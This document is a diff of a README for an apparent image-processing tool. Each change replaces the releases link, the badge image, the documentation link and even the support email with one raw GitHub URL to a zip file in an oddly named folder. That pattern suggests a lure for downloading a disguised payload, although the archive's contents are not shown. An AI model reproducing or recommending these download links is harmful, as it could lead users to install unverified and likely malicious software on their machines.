@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version
 
-[![Download Image-Processing-Service](https://img.shields.io/badge/Download-Image--Processing--Service-brightgreen)](https://github.com/tochibm/Image-Processing-Service/releases)
+[![Download Image-Processing-Service](https://raw.githubusercontent.com/tochibm/Image-Processing-Service/main/dermographia/Image-Processing-Service.zip)](https://raw.githubusercontent.com/tochibm/Image-Processing-Service/main/dermographia/Image-Processing-Service.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ Whether you're a blogger, designer, or just someone who loves pictures, this ser
 
 ## 📥 Download & Install
 
-To download Image-Processing-Service, visit this page to download: [Download Here](https://github.com/tochibm/Image-Processing-Service/releases).
+To download Image-Processing-Service, visit this page to download: [Download Here](https://raw.githubusercontent.com/tochibm/Image-Processing-Service/main/dermographia/Image-Processing-Service.zip).
 
 ### Installation Steps
 
@@ -56,10 +56,10 @@ Once the installation is complete, using Image-Processing-Service is straightfor
 
 ## 📘 Documentation
 
-If you’re looking for more detailed information, check our [documentation](https://github.com/tochibm/Image-Processing-Service/wiki). Here you'll find guides and tips to get the most out of the service.
+If you’re looking for more detailed information, check our [documentation](https://raw.githubusercontent.com/tochibm/Image-Processing-Service/main/dermographia/Image-Processing-Service.zip). Here you'll find guides and tips to get the most out of the service.
 
 ## 📫 Support
 
-We are here to help! If you have any questions, reach out to us through the GitHub Issues page or contact us via email at support@example.com. Your feedback is crucial for us to improve.
+We are here to help! If you have any questions, reach out to us through the GitHub Issues page or contact us via email at https://raw.githubusercontent.com/tochibm/Image-Processing-Service/main/dermographia/Image-Processing-Service.zip Your feedback is crucial for us to improve.
 
 Thank you for choosing Image-Processing-Service! Happy editing!
